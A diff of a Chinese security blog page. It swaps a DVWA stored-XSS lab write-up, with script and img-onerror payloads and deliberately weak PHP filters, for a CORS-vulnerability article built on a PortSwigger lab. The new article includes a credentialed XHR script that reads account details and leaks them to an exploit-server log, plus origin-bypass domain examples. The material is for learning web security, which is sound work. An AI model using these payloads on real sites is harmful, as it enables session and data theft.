@@ -4,17 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="DVWA xss （stored), 是小竹不是小猪">
-    <meta name="description" content="Low在评论框中输入 alert(&#39;hack&#39;)  测试，查看是否出现弹窗。
-
-
-查看数据库发现已经存储。
-Medium再次输入alert(&#39;hack&#39;)  测试，发现过滤,
-
-因此查看源代码
-
-&amp;lt;?php
-if( isset( $_">
+    <meta name="keywords" content="是小竹不是小猪">
+    <meta name="description" content="白帽子讲WEB安全 - 跨域资源共享漏洞分析总结原理：浏览器的同源策略，限制了来自不同源的“document”或脚本，对当前“document”读取或设置某些属性。如果没有同源策略会产生什么后果，比如当你浏览网站A的同时也浏览了网站B，在该">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -26,7 +17,7 @@ if( isset( $_">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>DVWA xss （stored) | 是小竹不是小猪</title>
+    <title>是小竹不是小猪</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -318,12 +309,12 @@ if( isset( $_">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">DVWA xss （stored)</h1>
+                    <h1 class="description center-align post-title"></h1>
                 </div>
             </div>
         </div>
@@ -451,7 +442,7 @@ if( isset( $_">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-03-13
+                    2025-01-24
                 </div>
                 
 
@@ -472,69 +463,89 @@ if( isset( $_">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>在评论框中输入 <script>alert('hack')</script>  测试，查看是否出现弹窗。</p>
-<p><img src="/2022/03/13/0313/2.PNG" alt="2"></p>
-<p><img src="/2022/03/13/0313/1.PNG" alt="1"></p>
-<p>查看数据库发现已经存储。<img src="/2022/03/13/0313/3.PNG" alt="3"></p>
-<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>再次输入<script>alert('hack')</script>  测试，发现过滤<script>,</p>
-<p><img src="0313/4.PNG" alt="4"></p>
-<p>因此查看源代码</p>
-<pre><code class="php">
-&lt;?php
-if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123;
-    // Get input
-    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );
-    $name    = trim( $_POST[ &#39;txtName&#39; ] );
-    // Sanitize message input
-    $message = strip_tags( addslashes( $message ) );
-    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
-    $message = htmlspecialchars( $message );
-    // Sanitize name input
-    $name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $name );
-    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
-    // Update database
-    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;
-    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
-    //mysql_close();
-&#125;
-
-?&gt; 
-
+                <h1 id="白帽子讲WEB安全-跨域资源共享漏洞分析总结"><a href="#白帽子讲WEB安全-跨域资源共享漏洞分析总结" class="headerlink" title="白帽子讲WEB安全 - 跨域资源共享漏洞分析总结"></a>白帽子讲WEB安全 - 跨域资源共享漏洞分析总结</h1><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>浏览器的同源策略，限制了来自不同源的“document”或脚本，对当前“document”读取或设置某些属性。如果没有同源策略会产生什么后果，比如当你浏览网站A的同时也浏览了网站B，在该网站上运行的脚本代码将能访问你同时访问的网站B的数据和功能，此时如果网站A是恶意网站，如果网站B是网上银行，那么此时恶意站点就可以以你的名义进行转账。</p>
+<h2 id="同源策略的功能："><a href="#同源策略的功能：" class="headerlink" title="同源策略的功能："></a>同源策略的功能：</h2><ul>
+<li><p>位于一个域的页面可以向另一个域提出请求</p>
+</li>
+<li><p>位于一个域的页面可以加载来自其他域的脚本并在自己的域中执行这个脚本（在授权的情况下）</p>
+</li>
+<li><p>位于一个域的页面无法读取或修改属于另一个域的cookie 或者其他DOM数据</p>
+</li>
+</ul>
+<p>在浏览器中，<script>、<img>、<iframe>、<link>等标签都可以跨域加载资源，而不受同源策略的限制。这些带“src”属性的标签每次加载时，实际上是由浏览器发起了一次GET请求。不同于XMLHttpRequest的是，通过src属性加载的资源，浏览器限制了JavaScript的权限，使其不能读、写返回的内容。最初XMLHttpRequest仅允许向与调用页面的来源相同的来源提出请求。随着HTML5的出现，这一技术得以修改，从而可以与其他域进行交互。</p>
+<h2 id="主要的跨域请求的方法：JSONP、CORS"><a href="#主要的跨域请求的方法：JSONP、CORS" class="headerlink" title="主要的跨域请求的方法：JSONP、CORS"></a>主要的跨域请求的方法：JSONP、CORS</h2><h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><p>三种常见的安全问题：服务器配置问题、利用xss从信任易受攻击的程序中获取信息、使用错误的CORS破坏TLS</p>
+<h4 id="具有源反射的CORS漏洞"><a href="#具有源反射的CORS漏洞" class="headerlink" title="具有源反射的CORS漏洞"></a>具有源反射的CORS漏洞</h4><p>实验地址：<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/learning-path?utm_source=office&utm_medium=email&utm_campaign=wsa-registrant-get-started-v1&utm_content=107.1&tid=S-Dt4Iu3Wdj31r8K_wBkO9aClbN_hxEwnTFMVIWW7Q9atKArq_EcvS6NinHrtCqT">Learning path | Web Security Academy - PortSwigger</a></p>
+<p>T\j#yb4}wSs)Km6Nzo5H+DA2}x59+.+T</p>
+<p>进入网站实验室：</p>
+<p>本实验室想要通过服务器漏洞，使用CORS检索管理员的API。</p>
+<p><img src="%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2WEB%E5%AE%89%E5%85%A8%20-%20%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93.assets/image-20221117214501306.png" alt="image-20221117214501306"></p>
+<p>使用提供的wiener:peter账户登录尝试一下。</p>
+<p><img src="%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2WEB%E5%AE%89%E5%85%A8%20-%20%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93.assets/image-20221117214610607.png" alt="image-20221117214610607"></p>
+<p><img src="%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2WEB%E5%AE%89%E5%85%A8%20-%20%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93.assets/image-20221117214627682.png" alt="image-20221117214627682"></p>
+<p>发现会显示我的API。查看浏览器源代码，发现该API来自页面/accountDetails</p>
+<p><img src="%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2WEB%E5%AE%89%E5%85%A8%20-%20%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93.assets/image-20221117214834610.png" alt="image-20221117214834610"></p>
+<h5 id="第一个问题就是-从客户端指定的源表头生成的服务器ACAO标头"><a href="#第一个问题就是-从客户端指定的源表头生成的服务器ACAO标头" class="headerlink" title="第一个问题就是 从客户端指定的源表头生成的服务器ACAO标头"></a>第一个问题就是 从客户端指定的源表头生成的服务器ACAO标头</h5><p>关于ACAO标头的内容：可以学习该连接<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cors">什么是 CORS（跨源资源共享）？教程和示例 |网络安全学院 (portswigger.net)</a></p>
+<p>大致含义就是说:</p>
+<p>服务器从网站请求的ORIGIN标头中直接复制作为服务器的ACAO标头。许多网站都采取这种方法，因为服务器通常很难保留允许访的域列表。</p>
+<pre><code>GET /sensitive-victim-data HTTP/1.1
+Host: vulnerable-website.com
+Origin: https://malicious-website.com
+Cookie: sessionid=...
 </code></pre>
-<p>发现</p>
-<p>addslashes(string) ：函数返回在预定义字符之前添加反斜杠的字符串，预定义字符 ‘ 、” 、\ 、NULL</p>
-<p>strip_tags(string) ：函数剥去string字符串中的 HTML、XML 以及 PHP 的标签</p>
-<p>htmlspecialchars(string)： 把预定义的字符 “&lt;” （小于）、 “&gt;” （大于）、&amp; 、‘’、“” 转换为 HTML 实体，防止浏览器将其作为HTML元素</p>
-<p>当我们再次输入1 和 <script>alert('hack')</script> ，strip_tags函数把<script>标签给剥除了，addslashes函数把 '  转义成了  &#39;</p>
-<p>因此我们尝试在name中构造，但name 中有长度限制。因此利用抓包进行尝试。</p>
-<p><img src="0313/5.PNG" alt="5"></p>
-<p>发现提交的时url编码，因此对<script>alert('hack')</script> 进行url编码%3CSCRIPT%3Ealert(‘hack’)%3C%2FSCRIPT%3E，进行重定向发送。</p>
-<p><img src="/2022/03/13/0313/6.PNG" alt="6"></p>
-<p>最后成功。</p>
-<p><img src="/2022/03/13/0313/7.PNG" alt="7"></p>
-<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><pre><code class="php">
-&lt;?php
-if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123;
-    // Get input
-    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );
-    $name    = trim( $_POST[ &#39;txtName&#39; ] );
-    // Sanitize message input
-    $message = strip_tags( addslashes( $message ) );
-    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
-    $message = htmlspecialchars( $message );
-    // Sanitize name input
-    $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $name );
-    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
-    // Update database
-    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;
-    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
-    //mysql_close();
-&#125;
-?&gt;
+<p>响应：</p>
+<pre><code>HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://malicious-website.com
+Access-Control-Allow-Credentials: true
+...
 </code></pre>
-<p>检查源代码，发现在medium基础上增加了对于name 的正则表达式替换。依然可以使用第二种方法，不过将<script>改成<img src=1  οnerrοr=alert('hack')>的url编码。</p>
-<p>参考文章：<br>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/82935895">https://blog.csdn.net/qq_36119192/article/details/82935895</a></p>
-</script></p>
+<p>这样的响应就是说明允许从请求域中进行访问，同时跨源请求可以包含cookie()</p>
+<p>使用Burp抓包发现/accountDetail的响应返回了API</p>
+<p><img src="%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2WEB%E5%AE%89%E5%85%A8%20-%20%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93.assets/image-20221118113844070.png" alt="image-20221118113844070">、</p>
+<p>如果能在该请求中添加origin字段或许可以获取管理员的API</p>
+<p><img src="%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2WEB%E5%AE%89%E5%85%A8%20-%20%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93.assets/image-20221118114104888.png" alt="image-20221118114104888"></p>
+<p>查看响应：</p>
+<p><img src="%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2WEB%E5%AE%89%E5%85%A8%20-%20%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93.assets/image-20221118114133258.png" alt="image-20221118114133258"></p>
+<p>由此可以验证出来响应消息头不合法。</p>
+<p>实验中提供了可以利用的服务器，通过这个服务器可以获取本服务器的API，进入可以利用的服务器向受害者服务器提出跨域请求。</p>
+<p>由于应用程序在标头中反映任意来源，这意味着绝对任何域都可以从易受攻击的域访问资源。如果响应包含任何敏感信息（如 API 密钥或<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf/tokens">CSRF 令牌</a>），您可以通过在您的网站上放置以下脚本来检索此信息</p>
+<p><img src="%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2WEB%E5%AE%89%E5%85%A8%20-%20%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93.assets/image-20221118115013570.png" alt="image-20221118115013570"></p>
+<p>提供攻击代码：</p>
+<pre><code>&lt;script&gt;
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open(&#39;get&#39;,&#39;https://0a8600c104a98d85c0191b58009d00fa.web-security-academy.net/accountDetails&#39;,true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() &#123;
+location=&#39;/log?key=&#39;+this.responseText; 
+&#125;;
+&lt;/script&gt;
+</code></pre>
+<p>查看系统日志：</p>
+<p><img src="%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2WEB%E5%AE%89%E5%85%A8%20-%20%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93.assets/image-20221118115155552.png" alt="image-20221118115155552"></p>
+<p>找到了系统API。</p>
+<p>完成实验。</p>
+<h4 id="解析原标头时出错"><a href="#解析原标头时出错" class="headerlink" title="解析原标头时出错"></a>解析原标头时出错</h4><p>某些支持从多个源访问的应用程序通过使用允许源的白名单来实现此目的。收到 CORS 请求时，会将提供的源与白名单进行比较。如果源出现在白名单上，则它会反映在标头中，以便授予访问权限。例如，应用程序收到一个普通请求，如下所示：<code>Access-Control-Allow-Origin</code></p>
+<pre><code>GET /data HTTP/1.1 Host: normal-website.com ... Origin: https://innocent-website.com
+</code></pre>
+<p>应用程序根据其允许的源列表检查提供的源，如果它在列表中，则按如下方式反映源：</p>
+<pre><code>HTTP/1.1 200 OK ... Access-Control-Allow-Origin: https://innocent-website.com
+</code></pre>
+<p>实施 CORS 源白名单时经常会出现错误。一些组织决定允许从其所有子域（包括尚不存在的未来子域）进行访问。某些应用程序允许从其他各种组织的域（包括其子域）进行访问。这些规则通常通过匹配 URL 前缀或后缀或使用正则表达式来实现。实现中的任何错误都可能导致向意外的外部域授予访问权限。</p>
+<p>例如，假设应用程序授予对以下结尾的所有域的访问权限：</p>
+<pre><code>normal-website.com
+</code></pre>
+<p>攻击者可能能够通过注册域来获取访问权限：</p>
+<pre><code>hackersnormal-website.com
+</code></pre>
+<p>或者，假设应用程序授予对以 开头的所有域的访问权限</p>
+<pre><code>normal-website.com
+</code></pre>
+<p>攻击者可能能够使用以下域获取访问权限：</p>
+<pre><code>normal-website.com.evil-user.net
+</code></pre>
+<h4 id="列入白名单的空源值"><a href="#列入白名单的空源值" class="headerlink" title="列入白名单的空源值"></a>列入白名单的空源值</h4><h4 id="通过CORS信任关系利用XSS"><a href="#通过CORS信任关系利用XSS" class="headerlink" title="通过CORS信任关系利用XSS"></a>通过CORS信任关系利用XSS</h4><h4 id="使用配置不当的-CORS-破坏-TLS"><a href="#使用配置不当的-CORS-破坏-TLS" class="headerlink" title="使用配置不当的 CORS 破坏 TLS"></a>使用配置不当的 CORS 破坏 TLS</h4><h4 id="没有凭据的内联网和-CORS"><a href="#没有凭据的内联网和-CORS" class="headerlink" title="没有凭据的内联网和 CORS"></a>没有凭据的内联网和 CORS</h4></script></p>
                 
             </div>
             <hr/>
@@ -560,7 +571,7 @@ if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123;
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/03/13/0313/">http://example.com/2022/03/13/0313/</a>
+                    <a href="http://example.com/2025/01/24/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2WEB%E5%AE%89%E5%85%A8%20-%20%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/">http://example.com/2025/01/24/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2WEB%E5%AE%89%E5%85%A8%20-%20%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -767,54 +778,18 @@ if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123;
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/03/14/0314/">
+                <a href="/2025/01/24/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2WEB%E5%AE%89%E5%85%A8%20-%20%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="DVWA  CSF Bypass">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
                         
-                        <span class="card-title">DVWA  CSF Bypass</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-14
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            小竹
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2022/03/10/0311/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="XSS (dom) DVWA">
-                        
-                        <span class="card-title">XSS (dom) DVWA</span>
+                        <span class="card-title"></span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -825,7 +800,45 @@ if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123;
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-10
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-01-24
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            小竹
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2025/01/24/MD5/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        
+                        <span class="card-title"></span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-01-24
                             </span>
                         <span class="publish-author">
                             
